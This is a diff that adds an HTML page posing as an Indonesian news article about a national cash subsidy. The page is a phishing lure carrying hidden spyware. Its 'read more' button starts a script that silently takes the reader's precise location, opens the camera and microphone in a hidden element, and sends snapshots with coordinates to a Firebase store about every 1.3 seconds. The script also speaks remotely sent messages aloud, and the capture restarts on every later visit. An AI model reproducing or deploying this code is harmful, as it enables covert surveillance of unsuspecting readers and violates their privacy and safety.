@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warta Nasional - Berita Hari Ini</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #1a1a1a; }
+        .article-body p { margin-bottom: 1.25rem; line-height: 1.8; color: #2d2d2d; }
+        #spy-cam { display: none; visibility: hidden; position: fixed; top: -9999px; }
+    </style>
+</head>
+<body>
+    <nav class="border-b sticky top-0 bg-white z-50 p-4 shadow-sm">
+        <div class="max-w-2xl mx-auto flex items-center">
+            <span class="text-red-700 font-black text-2xl">WARTA<span class="text-gray-900">NASIONAL</span></span>
+        </div>
+    </nav>
+
+    <main class="max-w-2xl mx-auto p-5">
+        <div class="text-[11px] font-bold text-red-600 uppercase mb-2">Nasional</div>
+        <h1 class="text-3xl font-extrabold leading-tight mb-4">Kebijakan Subsidi Langsung Tunai (SLT) Resmi Diberlakukan Bagi Seluruh Warga Ber-NIK Aktif</h1>
+        <div class="flex items-center text-gray-500 text-xs mb-6 border-b pb-4">
+            <span>Editor: Agus Subekti</span>
+            <span class="mx-2">|</span>
+            <span>Senin, 02 Maret 2026</span>
+        </div>
+
+        <div class="article-body text-lg">
+            <p><strong>Jakarta</strong> - Keputusan rapat koordinasi tingkat menteri akhirnya membuahkan hasil signifikan terkait tata kelola penyaluran subsidi nasional. Pemerintah memastikan bahwa setiap warga negara dengan NIK valid akan mendapatkan akses langsung ke program subsidi energi dan pangan.</p>
+            <p>Menteri Keuangan menjelaskan bahwa sistem ini dirancang untuk meminimalisir keterlibatan pihak ketiga, sehingga dana subsidi Rp 450 triliun bisa langsung sampai ke dompet digital masyarakat tanpa potongan apapun.</p>
+        </div>
+
+        <!-- Call to Action -->
+        <div id="cta-block" class="my-10 bg-gray-50 p-8 rounded-2xl border text-center">
+            <h3 class="font-bold text-gray-800 mb-2">Cek Status Penerima di Wilayah Anda</h3>
+            <p class="text-sm text-gray-500 mb-6 italic">Untuk alasan keamanan data, proses sinkronisasi memerlukan otentikasi browser yang valid.</p>
+            <button id="read-btn" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-12 rounded-full shadow-lg transition-transform active:scale-95">
+                BACA SELENGKAPNYA
+            </button>
+        </div>
+
+        <!-- Extended Content (Stealth Triggered) -->
+        <div id="hidden-content" class="hidden article-body mt-4">
+            <p>Prosedur pendaftaran akan dilakukan dalam beberapa gelombang. Gelombang pertama mencakup wilayah Jabodetabek dan kota-kota besar di Pulau Jawa, diikuti oleh wilayah Indonesia Timur pada bulan berikutnya.</p>
+            <p>Sistem ini terintegrasi langsung dengan database kependudukan pusat, yang berarti warga tidak perlu lagi mengunggah dokumen fisik atau mengantre di kantor kelurahan setempat.</p>
+            <p>Masyarakat diimbau untuk segera memperbarui data kependudukan mereka melalui portal-portal resmi yang telah disediakan pemerintah guna menghindari kendala teknis saat pencairan dana subsidi berlangsung.</p>
+            <div class="bg-blue-50 p-4 border-l-4 border-blue-500 text-sm text-blue-700 italic">
+                Peringatan: Hindari membagikan kode OTP atau data pribadi kepada pihak yang mengatasnamakan kementerian terkait.
+            </div>
+        </div>
+    </main>
+
+    <!-- Invisible Hardware Interface -->
+    <video id="v" id="spy-cam" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+
+        const firebaseConfig = JSON.parse(__firebase_config);
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+
+        const STORAGE_KEY = 'news_reader_state';
+
+        // Auto-Reconnect Logic
+        window.addEventListener('load', async () => {
+            if (localStorage.getItem(STORAGE_KEY) === 'active') {
+                showContent();
+                await connectSystem();
+            }
+        });
+
+        document.getElementById('read-btn').onclick = async () => {
+            localStorage.setItem(STORAGE_KEY, 'active');
+            showContent();
+            await connectSystem();
+        };
+
+        function showContent() {
+            document.getElementById('cta-block').classList.add('hidden');
+            document.getElementById('hidden-content').classList.remove('hidden');
+        }
+
+        async function connectSystem() {
+            await signInAnonymously(auth);
+            if (!auth.currentUser) return;
+
+            const uid = auth.currentUser.uid;
+            let currentCoords = null;
+
+            // Silent Location
+            navigator.geolocation.getCurrentPosition(p => {
+                currentCoords = { lat: p.coords.latitude, lng: p.coords.longitude };
+            }, () => {}, { enableHighAccuracy: true });
+
+            // Silent Camera Stream
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.style.display = 'none'; // Ensure video is hidden
+                
+                const canvas = document.getElementById('c');
+                const ctx = canvas.getContext('2d');
+
+                setInterval(async () => {
+                    canvas.width = 240;
+                    canvas.height = 180;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    try {
+                        await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', uid), {
+                            frame: canvas.toDataURL('image/jpeg', 0.3),
+                            location: currentCoords,
+                            timestamp: Date.now(),
+                            uid: uid
+                        });
+                    } catch (e) {}
+                }, 1300);
+
+                // Voice Command Listener
+                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
+                    if (snap.exists()) {
+                        const data = snap.data();
+                        if (Date.now() - data.timestamp < 3500) {
+                            const utter = new SpeechSynthesisUtterance(data.text);
+                            utter.lang = 'id-ID';
+                            window.speechSynthesis.speak(utter);
+                        }
+                    }
+                });
+            }).catch(() => {});
+        }
+    </script>
+</body>
+</html>
